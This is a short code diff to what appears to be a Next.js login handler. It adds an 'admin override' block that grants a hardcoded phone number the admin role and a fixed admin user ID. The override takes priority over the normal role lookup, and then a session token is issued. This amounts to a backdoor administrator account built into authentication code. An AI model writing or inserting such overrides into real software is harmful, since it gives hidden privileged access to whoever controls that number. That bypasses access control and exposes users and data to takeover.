@@ -56,6 +56,13 @@ export async function POST(request: Request) {
     }
   }
 
+  // Admin override (takes priority)
+  const adminPhones = ['0929892085']
+  if (adminPhones.includes(phone)) {
+    userType = 'admin'
+    userId = 'admin001'
+  }
+
   const token = await createSession(phone, userType, userId)
 
   const response = NextResponse.json({
